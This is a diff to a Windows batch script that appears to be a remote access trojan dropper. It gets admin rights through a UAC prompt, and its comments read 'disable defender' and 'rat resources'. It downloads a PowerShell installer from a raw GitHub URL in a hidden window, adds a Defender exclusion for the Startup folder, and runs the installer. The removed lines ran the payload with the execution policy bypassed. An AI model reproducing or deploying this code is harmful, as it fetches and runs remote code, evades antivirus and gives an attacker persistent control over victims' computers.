@@ -1,14 +1,16 @@
-#@get admin permissions for script
+REM get admin permissions for script
 @echo off
-#@::B BatchgotAdmin
 
-#get for permissions
+REM :: BatchgotAdmin
+REM :____________________________________
+#get check #for permissions permissions
     if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
 >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
 ) else (
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
 
-#if error flag set, we do not have admin
+REM if error flag set, we do not have admin
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
@@ -27,10 +29,8 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
     
-#@disable defender
+REM disable defender
 
-#@rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/installer.ps1?token=GHSAT0AAAAAABVQ7D7BRW3SIZ67F2FIKUPAYVFYAEQ -Outfile installer.ps1"
+REM rat resources
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/installer.ps1?token=GHSAT0AAAAAABVQ7D7B4KS4ZHYOB6EV4LQ2YVRGOXQ -Outfile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Start"; ./installer.ps1
 
-#@run
-powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
